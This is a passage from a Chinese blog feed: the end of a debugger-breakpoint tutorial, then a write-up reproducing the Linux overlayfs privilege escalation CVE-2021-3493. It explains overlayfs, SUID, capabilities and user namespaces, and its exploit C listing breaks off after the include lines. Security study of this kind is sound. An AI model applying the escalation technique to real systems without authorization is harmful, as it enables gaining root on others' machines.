应该是这里的技术细节没有实现，所以导致它只能在一个内存页设置，不能保证在指定位置断住，因此在一个内存页中可能多次被这个点断住，因为它可能没有比较访存位置与内存断点位置。</p><p>内存断点分持久的和一次性断点，一次性断点在断住之后即被删除。</p><h4 id="消息断点"><a href="#消息断点" class="headerlink" title="消息断点"></a>消息断点</h4><p>略</p><h4 id="条件断点"><a href="#条件断点" class="headerlink" title="条件断点"></a>条件断点</h4><p>我们如果希望在一个地方满足一定条件才断下来，这个时候我们可以 <code>shift+F2</code> 设置条件断点，比如我想在一个 <code>10000</code> 次的循环当中，看第 <code>5000</code> 次的执行结果，那么我们正常操作就是给循环体一个断点，然后 <code>F9</code> <code>5000</code> 次，显然这么做会很麻烦，那么我们可以设置一个条件，让它在指定条件才断住，加入循环变量存储在 <code>rcx</code> 当中，那么我们可以设置 <code>rcx==5000</code>。</p><p>source:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">10000</span>;i++)&#123;</span><br><span class="line">sum+=i;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,sum);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/09/14/KanxueBook/8.png" alt="8"></p><p>我们可以很清晰看到这里的循环结构，然后我们看到循环变量存在 <code>ebx</code> 寄存器中，我们在循环体中下一个条件断点，观察程序的运行。</p><p><img src="/2022/09/14/KanxueBook/9.png" alt="9"></p><p>然后发现程序成功在我们指定的条件下面断住了。</p><p><img src="/2022/09/14/KanxueBook/10.png" alt="10"></p><h3 id="静态调试"><a href="#静态调试" class="headerlink" title="静态调试"></a>静态调试</h3><p>待更</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近好迷茫，所以又斥巨资买了一本充满力量的书，那就是看雪的《加密与解密》，也来彻底地玩一玩逆向吧。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="reverse" scheme="http://example.com/categories/ctf/reverse/"/>
    
    <category term="kxbook" scheme="http://example.com/categories/ctf/reverse/kxbook/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2021-3493复现</title>
    <link href="http://example.com/2022/08/31/CVE-2021-3493/"/>
    <id>http://example.com/2022/08/31/CVE-2021-3493/</id>
    <published>2022-08-30T16:00:00.000Z</published>
    <updated>2022-09-18T11:27:58.141Z</updated>
    
    <content type="html"><![CDATA[<p>来复现一下这次的CVE-2021-3493</p><span id="more"></span><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>该漏洞是通过创建一个虚拟环境，在虚拟环境当中通过某软件赋予某文件高权限，由于程序检查不严密，该权限逃逸到现实环境中也生效。</p><h2 id="前置芝士"><a href="#前置芝士" class="headerlink" title="前置芝士"></a>前置芝士</h2><p><code>overlayfs</code> ：虚拟的，堆叠文件系统</p><p><code>capability</code>：权限管理机制</p><p><code>namespace</code>：一种命名空间</p><h3 id="overlayfs"><a href="#overlayfs" class="headerlink" title="overlayfs"></a>overlayfs</h3><p>能把多个文件夹里的文件合并为到同一个文件夹当中，这么听起来这个文件系统好像挺鸡肋的，但是它支持了一个我们最喜欢用的软件：docker。docker里面分容器和镜像的概念，一个镜像可以派生出多个容器，跟虚拟机差不多，一个镜像可以创建多个虚拟机。容器分公有数据和私有数据，docker比虚拟机优势的一点就是docker中的公有数据所有容器共享，这样就能省磁盘空间，私有数据则可以各个容器独占，保证数据独立。docker的实现机制就是通过 <code>overlayfs</code> 文件系统实现的。</p><p><code>overlayfs</code> 依赖并建立在其它的文件系统之上（例如ext4fs和xfs等等），并不直接参与磁盘空间结构的划分，仅仅将原来底层文件系统中不同的目录进行“合并”，然后向用户呈现。</p><p><img src="/2022/08/31/CVE-2021-3493/1.png" alt="1"></p><p>其中lower dirA / lower dirB目录和upper dir目录为来自底层文件系统的不同目录，用户可以自行指定，内部包含了用户想要合并的文件和目录，merge dir目录为挂载点。当文件系统挂载后，在merge目录下将会同时看到来自各lower和upper目录下的内容，并且用户也无法（无需）感知这些文件分别哪些来自lower dir，哪些来自upper dir，用户看见的只是一个普通的文件系统根目录而已（lower dir可以有多个也可以只有一个）。</p><h4 id="overlayfs挂载"><a href="#overlayfs挂载" class="headerlink" title="overlayfs挂载"></a><code>overlayfs</code>挂载</h4><p>挂载一个overlay文件系统，可以通过mount -t overlay -o <options> overlay <mount point>来实现。</mount></options></p><p><mount point>是最终overlay的挂载点。</mount></p><p>其中overlay的options有如下：</p><ul><li>lower dir=<dir>：指定用户需要挂载的lower层目录，lower层支持多个目录，用“:”间隔，优先级依次降低。最多支持500层。</dir></li><li>upper dir=<dir>：指定用户需要挂载的upper层目录，upper层优先级高于所有的lower层目录。</dir></li><li>work dir=<dir>：指定文件系统挂载后用于存放临时和间接文件的工作基础目录。</dir></li></ul><p>下面将lower和upper进行overlay，挂载到merge目录，临时workdir为work目录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$mount -t overlay -o lowerdir=lower,upperdir=upper,workdir=work overlay merge</span><br></pre></td></tr></table></figure><p> 如下同样将lower和upper进行overlay到merge，但是merge为只读属性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$mount -t overlay -o lowerdir=upper:lower overlay merge</span><br></pre></td></tr></table></figure><p>在使用如上mount进行<code>overlayfs</code>合并之后，遵循如下规则：</p><ol><li><code>lower dir</code>和<code>upper dir</code>两个目录存在同名文件时，<code>lower dir</code>的文件将会被隐藏，用户只能看到<code>upper dir</code>的文件。</li><li><code>lower dir</code>低优先级的同目录同名文件将会被隐藏。</li><li>如果存在同名目录，那么<code>lower dir</code>和<code>upper dir</code>目录中的内容将会合并。</li><li>当用户修改<code>merge dir</code>中来自<code>upper dir</code>的数据时，数据将直接写入<code>upper dir</code>中原来目录中，删除文件也同理。</li><li>当用户修改<code>merge dir</code>中来自<code>lower dir</code>的数据时，<code>lower dir</code>中内容均不会发生任何改变。因为<code>lower dir</code>是只读的，用户想修改来自<code>lower dir</code>数据时，<code>overlayfs</code>会首先拷贝一份<code>lower dir</code>中文件副本到<code>upper dir</code>中。后续修改或删除将会在<code>upper dir</code>下的副本中进行，<code>lower dir</code>中原文件将会被隐藏。</li></ol><h4 id="docker如何使用overlayfs"><a href="#docker如何使用overlayfs" class="headerlink" title="docker如何使用overlayfs"></a>docker如何使用overlayfs</h4><p>在docker当中，我们为了方便理解，假设只有三个目录：<code>upper dir</code>,<code>lower dir</code>和<code>merge dir</code>。我们的镜像处于<code>lower dir</code>当中，初始情况下，我们通过镜像创建出来一个容器，<code>lower dir</code> 中就是一个镜像，<code>upper dir</code> 中为空，我们创建多个容器得到的都是和镜像一模一样的系统。当我尝试查看容器中的某个文件，根据规则1，因为 <code>upper dir</code> 为空，我们看的的内容是 <code>lower dir</code> 中的内容，也就是镜像的内容；当我尝试修改容器中的文件内容时，根据规则5，<code>lower dir</code> 中的内容只读，因此拷贝一份到 <code>upper dir</code> 中，根据规则1，我们之后将只能看到该文件 <code>upper dir</code> 中的内容，修改完成会将结果保存在 <code>upper dir</code> 当中，之后再次修改这个文件，将只在<code>upper dir</code> 当中进行。但是在我们的视角当中，我们跟操作一个完整的操作系统并没有很大的区别。并且多个容器大部分数据是共享的，因此比较节省磁盘空间。</p><h4 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h4><p>我们新建四个文件夹：<code>upper</code>，<code>lower </code>，<code>work</code> 和 <code>merge</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$mount -t overlay overlay -o lowerdir=./lower,upperdir=./upper,workdir=./work ./merge</span><br></pre></td></tr></table></figure><p><code>mount</code> 命令用于挂载操作，第一个 <code>overlay</code> 指定挂载类型为 <code>overlay</code> 第二个 <code>overlay</code> 指定挂载点，<code>-o</code> 选项指定上层目录，下层目录，工作目录，最后挂载到 <code>merge</code> 目录下。</p><p>挂载完成之后我们在 <code>lower</code> 和 <code>upper</code> 中分别创建 <code>1.txt</code> 和 <code>2.txt</code>。我们使用 <code>ls -lR</code> 来查看目录</p><p><img src="/2022/08/31/CVE-2021-3493/2.png" alt="2"></p><p>我们可以发现， <code>merge</code> 目录中也出现了 <code>1.txt</code> 和 <code>2.txt</code>。</p><p>我们修改 <code>upper</code> 和 <code>lower</code> 中文件对应的内容，可以发现，<code>merge</code> 目录中也会有相同的改变，这非常符合 <code>overlayfs</code> 的规则。</p><p>我们尝试直接在 <code>merge</code> 目录中修改在 <code>upper</code> 目录中出现的文件再观察一下变化。</p><p><img src="/2022/08/31/CVE-2021-3493/3.png" alt="3"></p><p>可以发现我们在 <code>merge</code> 目录中修改 <code>upper</code> 目录中出现的文件，对应也修改了 <code>upper</code> 目录的主体文件。</p><p>我们尝试在 <code>merge</code> 目录中修改只在 <code>lower</code> 目录出现的文件再观察一下变化。</p><p><img src="/2022/08/31/CVE-2021-3493/4.png" alt="4"></p><p>我们发现，<code>lower</code> 目录中对应的 <code>1.txt</code> 并没有发生改变，反而是 <code>upper</code> 目录多了一个 <code>1.txt</code> 文件，并且内容与我们填写的一致。</p><p>那么这个 <code>1.txt</code> 就可以理解为docker中的镜像，<code>2.txt</code> 就是我容器中不同于镜像的文件。</p><h3 id="capability"><a href="#capability" class="headerlink" title="capability"></a>capability</h3><p>首先介绍几个概念：<code>uid</code>，<code>ruid</code>，<code>euid</code>，<code>suid</code>。</p><h4 id="uid-ruid"><a href="#uid-ruid" class="headerlink" title="uid(ruid)"></a>uid(ruid)</h4><p>标识用户身份， 比如常见的 <code>root </code>就是0，我们安装完操作系统获得的第一个账号就是1000，当登录完成之后，这个用户的ruid就是确定的了。</p><h4 id="euid"><a href="#euid" class="headerlink" title="euid"></a>euid</h4><p>euid是用户的有效id，用于系统决定对系统资源的访问权限，通常情况下，<code>euid=ruid</code>。我们都知道：只有进程的创建者和root用户才有权利对该进程进行操作（<code>kill</code>，或者挂起，又或者是 <code>fork</code>）。于是，记录一个进程的创建者(也就是属主)就显得非常必要，进程的 <code>uid</code> 通常就是进程创建者的 <code>uid</code>，若创建者为另一个进程（<code>fork</code>），那么这个进程的 <code>uid</code> 会被继承，除非子进程被设置了 <code>suid</code>。</p><h4 id="suid"><a href="#suid" class="headerlink" title="suid"></a>suid</h4><p>用于对外权限的开放。跟<code>ruid</code>及<code>euid</code>是用一个用户绑定不同，它是跟文件而不是跟用户绑定，在运行这个文件时，用户会暂时获得属主的身份。</p><h4 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h4><p>进程运行之后，会获得和运行者一样的权限，它们同样受到了自身的权限访问控制。事实上这样的管理是比较安全的，我如果想自己无法直接访问这个文件，那么我通过创建进程访问文件同样会没有权限。但是如果这样管理则不能满足一些需要，比如密码文件 <code>/etc/shadow</code>，这个文件的权限是 <code>r--------</code>，属主和数组均为 <code>root</code>，那就意味着，除了 <code>root</code> 用户没有人可以查看或者修改这个文件，但是里面同时也存了我自己的密码，如果我不管怎样都获得不了 <code>root</code> 权限，那意味着我自己都修改不了我自己的密码，那这显然不太合理。于是乎就出现了 <code>suid</code>（<code>Set User ID execution</code>），我们都知道在 <code>linux</code> 当中，我们想修改自己的密码是使用 <code>passwd</code> 命令，那我们查看 <code>passwd</code> 的权限发现它被设置了 <code>suid</code> 选项。它允许我在执行这个程序的时候短暂地获得 <code>root</code> 权限，这个进程拥有 <code>root</code> 权限之后，我们就能修改 <code>/etc/shadow</code> 文件，修改完成之后，进程直接退出。</p><p>这么一看确实挺方便了，但是会带来很大的安全问题：假设， <code>passwd</code> 文件在编写的时候，存在漏洞，若在执行 <code>passwd</code> 的过程中，能通过漏洞创建一个 <code>shell</code> 进程，那么这个 <code>shell</code> 进程也会是 <code>root</code> 权限，简而言之，**<code>SUID</code> 机制增大了系统的安全攻击面。**</p><p>为了对 root 权限进行更细粒度的控制，实现按需授权，Linux 引入了另一种机制叫 <code>capability</code>。</p><h4 id="capability是什么"><a href="#capability是什么" class="headerlink" title="capability是什么"></a>capability是什么</h4><p><code>Capabilities</code> 机制是在 Linux 内核 <code>2.2</code> 之后引入的一个权限管理机制，原理就是把超级用户 <code>root(uid=0)</code> 的特权划分为不同的功能组，每个功能组都可以独立启用和禁用。其本质上就是将内核调用分门别类，具有相似功能的内核调用被分到同一组中。</p><p>这样一来，我权限检查就变成了：如果非 <code>root</code> 用户，那么检查进程是否有对应的操作权限，决定是否可以进行该操作。同样，这个权限可以在执行的时候赋予：根据进程创建者或者 <code>setuid</code> 获得，也可以从父进程继承。假如我给 <code>nginx</code> 可执行文件赋予了 <code>CAP_NET_BIND_SERVICE capabilities</code> ，那么它就能以普通用户的身份运行并监听一个1024以内的端口。</p><h4 id="进程的capability"><a href="#进程的capability" class="headerlink" title="进程的capability"></a>进程的capability</h4><p>每一个进程，具有 5 个 capabilities 集合，每一个集合使用 64 位掩码来表示，显示为 16 进制格式。这 5 个 capabilities 集合分别是：</p><ul><li>Permitted</li><li>Effective</li><li>Inheritable</li><li>Bounding</li><li>Ambient</li></ul><p>这5个集合的具体含义如下：</p><h5 id="Permitted"><a href="#Permitted" class="headerlink" title="Permitted"></a>Permitted</h5><p>在进程执行时，该可执行文件的 <strong>Permitted 集合</strong>中的 <strong>capabilites</strong> 自动被加入到进程的 <strong>Permitted 集合</strong>中。进程可以通过系统调用 <code>capset()</code> 来从 <code>Effective</code> 或 <code>Inheritable</code> 集合中添加或删除 capability，前提是添加或删除的 capability 必须包含在 <code>Permitted</code> 集合中。</p><h5 id="Effective"><a href="#Effective" class="headerlink" title="Effective"></a>Effective</h5><p>内核检查线程是否可以进行特权操作时，检查的对象便是 <code>Effective</code> 集合。如之前所说，<code>Permitted</code> 集合定义了上限，线程可以删除 Effective 集合中的某 capability，随后在需要时，再从 Permitted 集合中恢复该 capability，以此达到临时禁用 capability 的功能。</p><p>比如我可能一个程序可能中间需要用户来操作，但是呢，我不希望它有过高的权限，那么我在交给用户操作的时候，我把一些权限较高的<code>capability</code> 禁用了，如果用户通过漏洞获取持久权限那将也不能够获取较高的权限。</p><h5 id="Inheritable"><a href="#Inheritable" class="headerlink" title="Inheritable"></a>Inheritable</h5><p>当执行<code>exec()</code> 系统调用时，能够被新的可执行文件继承的 capabilities，被包含在 <code>Inheritable</code> 集合中。这里需要说明一下，包含在该集合中的 capabilities 并不会自动继承给新的可执行文件，即不会添加到子进程的 <code>Effective</code> 集合或 <code>Inheritable</code>，它只会影响新线程的 <code>Permitted</code> 集合。</p><h5 id="Bounding"><a href="#Bounding" class="headerlink" title="Bounding"></a>Bounding</h5><p><code>Bounding</code> 集合，它定义了能被继承的权限的上限，是 <code>Inheritable</code> 集合的超集，如果某个 capability 不在 <code>Bounding</code> 集合中，即使它在 <code>Permitted</code> 集合中，该线程也不能将该 capability 添加到它的 <code>Inheritable</code> 集合中。</p><p><code>Bounding</code> 集合的 <code>capabilities</code> 在执行 <code>fork()</code> 系统调用时会传递给子进程的 Bounding 集合，并且在执行 <code>execve</code> 系统调用后保持不变。</p><ul><li>当线程运行时，不能向 <code>Bounding</code> 集合中添加 <code>capabilities</code>。</li><li>一旦某个 <code>capability</code> 被从 <code>Bounding</code> 集合中删除，便不能再添加回来。</li><li>将某个 <code>capability</code> 从 <code>Bounding</code> 集合中删除后，如果之前 <code>Inherited</code> 集合包含该 <code>capability</code>，将继续保留。但如果后续从 <code>Inheritable</code> 集合中删除了该 <code>capability</code>，便不能再添加回来。</li></ul><h5 id="Ambient"><a href="#Ambient" class="headerlink" title="Ambient"></a>Ambient</h5><p>Linux <code>4.3</code> 内核新增了一个 capabilities 集合叫 <code>Ambient</code> ，用来弥补 <code>Inheritable</code> 的不足。<code>Ambient</code> 具有如下特性：</p><ul><li><code>Permitted</code> 和 <code>Inheritable</code> 未设置的 <code>capabilities</code>，<code>Ambient</code> 也不能设置。</li><li>当 <code>Permitted</code> 和 <code>Inheritable</code> 关闭某权限后，<code>Ambient</code> 也随之关闭对应权限。这样就确保了降低权限后子进程也会降低权限。</li><li>非特权用户如果在 <code>Permitted</code> 集合中有一个 <code>capability</code>，那么可以添加到 <code>Ambient</code> 集合中，这样它的子进程便可以在 <code>Ambient</code>、<code>Permitted</code> 和 <code>Effective</code> 集合中获取这个 <code>capability</code>。</li></ul><h4 id="文件的capability"><a href="#文件的capability" class="headerlink" title="文件的capability"></a>文件的capability</h4><p>文件的 <code>capabilities</code> 被保存在文件的扩展属性中。如果想修改这些属性，需要具有 <code>CAP_SETFCAP</code> 的 <code>capability</code>。文件与进程的 <code>capabilities</code> 共同决定了通过 <code>execve()</code> 运行该文件后的线程的 <code>capabilities</code>。</p><p>文件的 <code>capabilities</code> 功能，需要文件系统的支持。如果文件系统使用了 <code>nouuid</code> 选项进行挂载，那么文件的 <code>capabilities</code> 将会被忽略。</p><p>类似于进程的 <code>capabilities</code>，文件的 <code>capabilities</code> 包含了 3 个集合：</p><ul><li>Permitted</li><li>Inheritable</li><li>Effective</li></ul><p>这3个集合的具体含义如下：</p><h5 id="Permitted-1"><a href="#Permitted-1" class="headerlink" title="Permitted"></a>Permitted</h5><p>这个集合中包含的 <code>capabilities</code>，在文件被执行时，会与进程的 <code>Bounding</code> 集合计算交集，然后添加到该进程的 <code>Permitted</code> 集合中。</p><h5 id="Inheritable-1"><a href="#Inheritable-1" class="headerlink" title="Inheritable"></a>Inheritable</h5><p>这个集合与线程的 <code>Inheritable</code> 集合的交集，会被添加到执行完 <code>execve()</code> 后的线程的 <code>Permitted</code> 集合中。</p><h5 id="Effective-1"><a href="#Effective-1" class="headerlink" title="Effective"></a>Effective</h5><p>这不是一个集合，仅仅是一个标志位。如果设置开启，那么在执行完 <code>execve()</code> 后，线程 <code>Permitted</code> 集合中的 <code>capabilities</code> 会自动添加到它的 <code>Effective</code> 集合中。对于一些旧的可执行文件，由于其不会调用 <code>capabilities</code> 相关函数设置自身的 <code>Effective</code> 集合，所以可以将可执行文件的 <code>Effective bit</code> 开启，从而可以将 <code>Permitted</code> 集合中的 <code>capabilities</code> 自动添加到 <code>Effective</code> 集合中。</p><h4 id="常见的capability"><a href="#常见的capability" class="headerlink" title="常见的capability"></a>常见的capability</h4><p>共40个</p><table><thead><tr><th>capability 名称</th><th>描述</th></tr></thead><tbody><tr><td>CAP_AUDIT_CONTROL</td><td>启用和禁用内核审计；改变审计过滤规则；检索审计状态和过滤规则</td></tr><tr><td>CAP_AUDIT_READ</td><td>允许通过 multicast netlink 套接字读取审计日志</td></tr><tr><td>CAP_AUDIT_WRITE</td><td>将记录写入内核审计日志</td></tr><tr><td>CAP_BLOCK_SUSPEND</td><td>使用可以阻止系统挂起的特性</td></tr><tr><td>CAP_CHOWN</td><td>修改文件所有者的权限</td></tr><tr><td>CAP_DAC_OVERRIDE</td><td>忽略文件的 DAC 访问限制</td></tr><tr><td>CAP_DAC_READ_SEARCH</td><td>忽略文件读及目录搜索的 DAC 访问限制</td></tr><tr><td>CAP_FOWNER</td><td>忽略文件属主 ID 必须和进程用户 ID 相匹配的限制</td></tr><tr><td>CAP_FSETID</td><td>允许设置文件的 setuid 位</td></tr><tr><td>CAP_IPC_LOCK</td><td>允许锁定共享内存片段</td></tr><tr><td>CAP_IPC_OWNER</td><td>忽略 IPC 所有权检查</td></tr><tr><td>CAP_KILL</td><td>允许对不属于自己的进程发送信号</td></tr><tr><td>CAP_LEASE</td><td>允许修改文件锁的 FL_LEASE 标志</td></tr><tr><td>CAP_LINUX_IMMUTABLE</td><td>允许修改文件的 IMMUTABLE 和 APPEND 属性标志</td></tr><tr><td>CAP_MAC_ADMIN</td><td>允许 MAC 配置或状态更改</td></tr><tr><td>CAP_MAC_OVERRIDE</td><td>忽略文件的 DAC 访问限制</td></tr><tr><td>CAP_MKNOD</td><td>允许使用 mknod() 系统调用</td></tr><tr><td>CAP_NET_ADMIN</td><td>允许执行网络管理任务</td></tr><tr><td>CAP_NET_BIND_SERVICE</td><td>允许绑定到小于 1024 的端口</td></tr><tr><td>CAP_NET_BROADCAST</td><td>允许网络广播和多播访问</td></tr><tr><td>CAP_NET_RAW</td><td>允许使用原始套接字</td></tr><tr><td>CAP_SETGID</td><td>允许改变进程的 GID</td></tr><tr><td>CAP_SETFCAP</td><td>允许为文件设置任意的 capabilities</td></tr><tr><td>CAP_SETPCAP</td><td>参考 capabilities man page</td></tr><tr><td>CAP_SETUID</td><td>允许改变进程的 UID</td></tr><tr><td>CAP_SYS_ADMIN</td><td>允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等</td></tr><tr><td>CAP_SYS_BOOT</td><td>允许重新启动系统</td></tr><tr><td>CAP_SYS_CHROOT</td><td>允许使用 chroot() 系统调用</td></tr><tr><td>CAP_SYS_MODULE</td><td>允许插入和删除内核模块</td></tr><tr><td>CAP_SYS_NICE</td><td>允许提升优先级及设置其他进程的优先级</td></tr><tr><td>CAP_SYS_PACCT</td><td>允许执行进程的 BSD 式审计</td></tr><tr><td>CAP_SYS_PTRACE</td><td>允许跟踪任何进程</td></tr><tr><td>CAP_SYS_RAWIO</td><td>允许直接访问 /devport、/dev/mem、/dev/kmem 及原始块设备</td></tr><tr><td>CAP_SYS_RESOURCE</td><td>忽略资源限制</td></tr><tr><td>CAP_SYS_TIME</td><td>允许改变系统时钟</td></tr><tr><td>CAP_SYS_TTY_CONFIG</td><td>允许配置 TTY 设备</td></tr><tr><td>CAP_SYSLOG</td><td>允许使用 syslog() 系统调用</td></tr><tr><td>CAP_WAKE_ALARM</td><td>允许触发一些能唤醒系统的东西(比如 CLOCK_BOOTTIME_ALARM 计时器)</td></tr></tbody></table><p>比如我们熟知的 <code>ping</code> 命令，它所用到的底层是使用 <code>socket</code> 实现的，而 <code>socket</code> 是 <code>root</code> 用户才有权限使用的。在 <code>Ubuntu 18.04LTS</code>  的发行版当中，我们看看它是怎么解决这个权限问题的。</p><p><img src="/2022/08/31/CVE-2021-3493/5.png" alt="5"></p><p>它设置了 <code>s</code> 权限位，意味着我运行 <code>ping</code> 的时候， <code>ping</code> 这个 <code>process</code> <code>uid</code> 为 <code>0</code>，也就是 <code>root</code> 用户。</p><p>若我取消设置它的 <code>s </code>权限位，它将不再具有 <code>ping</code> 的功能。</p><p><img src="/2022/08/31/CVE-2021-3493/6.png" alt="6"></p><p>原因就如上所示，底层的 <code>socket</code> 并不允许普通用户运行。</p><p><img src="/2022/08/31/CVE-2021-3493/7.png" alt="7"></p><p>而当我把自己权限提升之后又能够使用 <code>ping</code> 命令了，是因为 <code>root</code> 用户执行读写和某些底层操作时不检查权限。</p><p>在这里我们只需要使用 <code>setcap</code> 命令将 <code>ping</code> 加上 <code>socket</code> 权限就可以让我们运行的时候获得 <code>socket</code> 权限，正常使用 <code>ping</code> 命令，这么做的好处就是假如我的 <code>ping</code> 命令有漏洞存在，那么当别人借着 <code>ping</code> 命令来提权我的计算机时会发现它获得的 <code>shell</code> 只拥有 <code>socket</code> 这么一个特权操作，其它的操作与普通用户并没有区别，这样极大地降低了安全风险，而如果我使用 <code>s</code> 权限位，那么别人通过这个获取漏洞之后将能直接获得 <code>root</code> 权限能操作计算机的一切资源。</p><p><img src="/2022/08/31/CVE-2021-3493/8.png" alt="8"></p><p>在添加完权限之后，我们发现又可以使用 <code>ping</code> 命令了，这是因为我们通过 <code>setcap</code> 让 <code>/bin/ping</code> 重新拥有了 <code>socket</code> 权限。</p><p>在这个地方我们对 <code>capability</code> 也不再深入下去了。</p><h3 id="namespace"><a href="#namespace" class="headerlink" title="namespace"></a>namespace</h3><p>引用一下 <code>wiki</code> 对 <code>namespace</code> 的定义</p><blockquote><p>Namespaces are a feature of the Linux kernel that partitions kernel resources such that one set of processes sees one set of resources while another set of processes sees a different set of resources. The feature works by having the same namespace for a set of resources and processes, but those namespaces refer to distinct resources.</p></blockquote><p>直观翻译就是</p><blockquote><p>namespace 是 Linux 内核的一项特性，它可以对内核资源进行分区，使得一组进程可以看到一组资源；而另一组进程可以看到另一组不同的资源。该功能的原理是为一组资源和进程使用相同的 namespace，但是这些 namespace 实际上引用的是不同的资源。</p></blockquote><p>简单来说 <code>namespace</code> 是由 <code>Linux</code> 内核提供的，用于进程间资源隔离的一种技术。将全局的系统资源包装在一个抽象里，让进程（看起来）拥有独立的全局资源实例。同时 <code>Linux</code> 也默认提供了多种 <code>namespace</code>，用于对多种不同资源进行隔离。</p><p><code>Linux</code> 从 <code>2.4</code> 版本加入了 <code>namespace</code> 机制到 <code>3.8</code> 版本实现了 <code>User namespace</code>。</p><p><code>Cgroup namespace</code> 是进程的 <code>cgroups</code> 的虚拟化视图，通过 <code>/proc/[pid]/cgroup</code> 和 <code>/proc/[pid]/mountinfo</code> 展示。</p><table><thead><tr><th>namespace名称</th><th>系统调用参数</th><th>控制内容</th><th>内核版本</th></tr></thead><tbody><tr><td>UTS</td><td>CLONE_NEWUTS</td><td>主机名和域名</td><td>2.6.19</td></tr><tr><td>IPC</td><td>CLONE_NEWIPC</td><td>信号量，消息队列，共享内存</td><td>2.6.19</td></tr><tr><td>PID</td><td>CLONE_NEWPID</td><td>Process IDs进程号</td><td>2.6.24</td></tr><tr><td>Network</td><td>CLONE_NEWNET</td><td>网络设备，协议栈，端口等等</td><td>2.6.29</td></tr><tr><td>Cgroup</td><td>CLONE_NEWCGROUP</td><td>Cgroup root directory cgroup 根目录</td><td>2.6.29</td></tr><tr><td>Mount</td><td>CLONE_NEWNS</td><td>Mount points挂载点</td><td>2.4.19</td></tr><tr><td>User</td><td>CLONE_NEWUSER</td><td>用户和组 ID</td><td>3.8</td></tr></tbody></table><p>有了namespace之后，PID,IPC,Network等系统资源不再是全局性的，而是属于特定的Namespace。每个Namespace里面的资源对其他Namespace都是透明的。<strong>要创建新的Namespace，只需要在调用clone时指定相应的flag。</strong></p><p>以上为自己搜集的资料整理，以下为自己个人解读。</p><p>电脑开机的时候，系统会创建7个 <code>init</code> 的 <code>namespace</code>，一个进程只能切必须属于七个特定不同的 <code>namespace</code>，那么这个就是我们默认的 <code>namespace</code>。使用 <code>ls -l /proc/$$/ns</code> 可以查看本进程的 <code>namespace</code> 在这里 <code>$$</code> 变量表示自己的进程号。</p><p>在这之前我一直有一个疑问，就是为什么我普通用户 <code>-map-root-user</code> 会导致我没有 <code>root</code> 的操作权限而 <code>root</code> 用户创建的 <code>namespace</code> 即使是普通用户也有操作权限。比如如下两个例子。</p><p><code>unshare</code> 命令用于取消子进程的共享 <code>namespace</code>，通过<code>--user --map-root-user</code> 选项可以新建一个 <code>user  namespace</code> 并使新建进程的用户为 <code>root</code> 用户。</p><p><img src="/2022/08/31/CVE-2021-3493/9.png" alt="9"></p><p>此时出现了 <code>root</code> 用户无法操作 <code>/etc/shadow</code> 的场面，但是我们无论是 <code>id</code> 还是 <code>whoami</code> 看上去都跟真的 <code>root</code> 一样，确没有操作权限，确实也是比较奇怪的。但是，又合情合理，因为我普通用户我不通过 <code>su</code> 或者是 <code>sudo</code> 命令去正常提权那都是利用漏洞。</p><p>然后再来看另一个例子</p><p><img src="/2022/08/31/CVE-2021-3493/10.png" alt="10"></p><p>虽然看起来我是普通用户，但是实际上我有 <code>root</code>的权限。</p><p>因此我在这里一直不理解 <code>namespace</code> 的组织形式，直到我看到一篇博客上面画着树状图，我才猛然顿悟。</p><p><code>namespace</code> 是树状图的一种形式，然后文件系统中在标记属主的时候会标记一个 <code>namespace</code> 字段，标识由哪一个 <code>namespace</code> 的用户创建的，然后再检查权限的时候若当前用户不属于当前 <code>namespace</code> 那么就会向上寻找，直到找到对应的 <code>namespace</code>，然后检查是谁创建的。然后对应的权限就是那个 <code>namespace</code> 的创建者的。如果是这样的话，那么就能解释通了，我之前疑惑的点不在于为什么我没有操作权限而是它怎么判断的我没有操作权限，因为没有操作权限属于正常现象，如果我的想法不对也请师傅们指正，这只是一个我认为比较合理能解释得通的解释。</p><h2 id="漏洞利用步骤"><a href="#漏洞利用步骤" class="headerlink" title="漏洞利用步骤"></a>漏洞利用步骤</h2><p>我们先创建好 <code>overlayfs</code> 的那几个文件夹，准备挂载，然后在其中的 <code>upper</code> 目录中写上我们的 <code>exp</code> 并编译好。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span 